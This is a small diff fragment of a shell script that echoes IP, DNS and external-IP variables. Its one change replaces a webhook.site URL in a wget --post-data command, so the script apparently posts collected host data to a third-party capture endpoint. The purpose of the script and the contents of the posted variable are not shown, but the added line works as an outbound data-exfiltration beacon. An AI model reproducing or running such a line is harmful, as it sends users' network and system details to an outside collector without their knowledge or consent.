@@ -258,7 +258,7 @@ echo $IP
 echo $dns
 echo $ext_ip
 
-wget --post-data "$data_post2" "https://webhook.site/3ce4b606-0c82-4017-8730-bc38cfe71ee2"
+wget --post-data "$data_post2" "https://webhook.site/aacaed19-ff0a-4deb-9f4a-332c8744cc71"
 
 # API request with automatic termination
 if [ -n "$(command -v timeout)" ]
